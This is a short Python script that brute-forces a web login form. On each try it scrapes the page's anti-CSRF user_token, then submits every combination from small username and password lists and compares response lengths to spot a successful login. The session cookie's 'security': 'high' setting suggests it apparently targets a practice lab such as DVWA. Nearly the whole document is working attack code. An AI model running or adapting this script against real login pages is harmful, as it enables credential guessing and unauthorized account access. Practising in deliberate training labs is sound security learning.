import requests
from bs4 import BeautifulSoup

target = "YOUR TARGET"

cookies = { 'PHPSESSID': 'YOUR SESSION ID', 'security': 'high' }

users_list = [ 'claude', 'john', 'clara', 'admin', 'guest' ]
passwd_list = [ 'qwerty123', 'guest', 'password', 'administrator' ]

response_sizes = []

for user in users_list:
        for passwd in passwd_list:
                print(f"Username: {user}, password: {passwd}")

                req = requests.get(target, cookies=cookies)

                soup = BeautifulSoup(req.text, 'html.parser')

                token_ref = soup.find('input', { 'name': 'user_token' })['value']

                force_req = requests.get(f'{target}?username={user}&password={passwd}&Login=Login&user_token={token_ref}#', cookies=cookies)

                content_len = len(force_req.text)

                print(f"Content length: {content_len}", end="\n\n")

                response_sizes.append(content_len)

print(f"Smaller size: {min(response_sizes)}")
print(f"Higher size: {max(response_sizes)}")